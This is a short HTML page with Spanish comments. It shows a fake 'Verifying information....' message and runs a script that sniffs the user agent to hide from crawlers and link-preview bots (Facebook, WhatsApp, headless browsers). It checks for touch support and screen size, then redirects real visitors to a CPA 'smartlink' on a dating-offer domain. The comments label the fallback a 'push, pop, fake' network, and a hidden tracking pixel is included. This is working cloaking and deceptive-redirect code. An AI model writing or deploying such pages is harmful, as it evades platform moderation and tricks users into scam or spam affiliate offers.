<head>
  <meta charset="UTF-8">

  <title>Redirigiendo...</title>
  <style>
    body {
      margin: 0;
      background-color: #000;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
      font-family: Arial, sans-serif;
    }
    .msg {
      text-align: center;
      font-size: 1.2em;
    }
  </style>
</head>
<body>
  <div class="msg">
    <p>Verifying information....</p>
  </div>

  <script>
    // Lista de enlaces CPA
    const smartlinks = [
      "https://daupmrb.exciting-mixer-dates.com/umlr55m",
      "https://daupmrb.exciting-mixer-dates.com/umlr55m",
      "https://daupmrb.exciting-mixer-dates.com/umlr55m",
      "https://daupmrb.exciting-mixer-dates.com/umlr55m"
    ];

    // Red secundaria (push, pop, fake)
    const fallback = "https://daupmrb.exciting-mixer-dates.com/umlr55m";

    // Detección básica de bots
    const isBot = /bot|crawl|preview|spider|facebook|whatsapp|headless|phantom/i.test(navigator.userAgent);
    const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    const screenOK = window.innerWidth > 300 && window.innerHeight > 300;

    // Redirigir en 2 segundos si pasa el filtro
    setTimeout(() => {
      if (!isBot && hasTouch && screenOK) {
        const finalLink = smartlinks[Math.floor(Math.random() * smartlinks.length)];
        window.location.href = finalLink;
      } else {
        window.location.href = fallback;
      }
    }, 2000);
  </script>

  <!-- Pixel invisible opcional -->
   <div style="visibility:hidden">

      <img src="//whos.amung.us/pingjs/?k=lonelywolf&amp;t=TeamCastle&amp;x=https://www.youtube.com/" style="display:none">

</body>
